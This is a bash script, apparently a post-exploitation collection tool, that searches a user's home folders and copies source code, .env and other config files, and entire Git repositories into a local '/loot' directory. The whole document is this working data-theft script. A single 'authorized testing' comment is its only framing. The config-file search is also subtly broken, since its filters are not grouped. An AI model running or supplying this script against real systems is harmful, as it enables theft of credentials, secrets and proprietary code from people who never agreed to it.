#!/bin/bash
# Source Code Collector - Development files and repos
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY

echo "[+] Source Code Collector"

DEST="/loot/source-code"
mkdir -p $DEST/{code,config,repos}

# Source code files
echo "[*] Collecting source files..."
find ~/Documents ~/Projects ~/Desktop -type f \( -name "*.py" -o -name "*.js" -o -name "*.java" -o -name "*.cpp" -o -name "*.c" -o -name "*.go" -o -name "*.rs" \) -size -1M -exec cp {} $DEST/code/ \; 2>/dev/null

# Config files
echo "[*] Collecting config files..."
find ~ -name ".env" -o -name "config.json" -o -name "settings.py" -o -name "*.conf" -size -100k -exec cp {} $DEST/config/ \; 2>/dev/null

# Git repos (collect .git folders)
echo "[*] Finding Git repositories..."
find ~/Documents ~/Projects -name ".git" -type d | while read gitdir; do
    repo_name=$(basename $(dirname "$gitdir"))
    cp -r "$(dirname $gitdir)" "$DEST/repos/$repo_name" 2>/dev/null
done

CODE_COUNT=$(ls -1 $DEST/code 2>/dev/null | wc -l)
REPO_COUNT=$(ls -1 $DEST/repos 2>/dev/null | wc -l)

echo "[+] Collected $CODE_COUNT source files and $REPO_COUNT repositories"
